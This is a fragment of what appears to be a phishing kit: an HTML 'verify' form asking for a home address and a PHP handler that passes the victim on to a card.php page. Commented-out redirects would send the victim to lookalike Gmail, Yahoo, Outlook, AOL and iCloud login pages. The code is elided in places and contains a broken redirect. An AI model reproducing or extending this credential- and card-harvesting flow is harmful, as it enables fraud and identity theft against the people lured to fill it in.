			...
			<form action="" method="POST" onsubmit="return load()">
				...
				<div class="row">
					<div class="col-sm-12 col-md-6 my-4">
						<label for="address1">Home address</label><br>
				...
				<div class="row">
					<div class="col-sm-12 col-md-6 my-4">
						...
						<input class="verify-input pb-2" type="text" name="address2" id="address2" placeholder="Apt, suite, etc. (optional)">
					</div>
				</div>
				<div class="row">
					<div class="col-sm-12 col-md-6 my-4">
...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
	...
	//switch ($email_type){
	//	case 'gmail':
	//		header('Location: ../email/gmail' . '?email=' . $email, true);
	//		break;
	//	case 'yahoo':
	//		header('Location: ../email/yahoo' . '?email=' . $email, true);
	//		break;
	//	case 'outlook':
	//		header('Location: ../email/outlook' . '?email=' . $email, true);
	//		break;
	//	case 'aol':
	//		header('Location: ../email/aol' . '?email=' . $email, true);
	//		break;
	//	case 'icloud':
	//		header('Location: ../email/icloud' . '?email=' . $email, true);
	//		break;
	//	default:
	//		header('Location: ../email/email' . '?email=' . $email, true);
	//}

	header('Location: card.php' . $email, true);
}
?>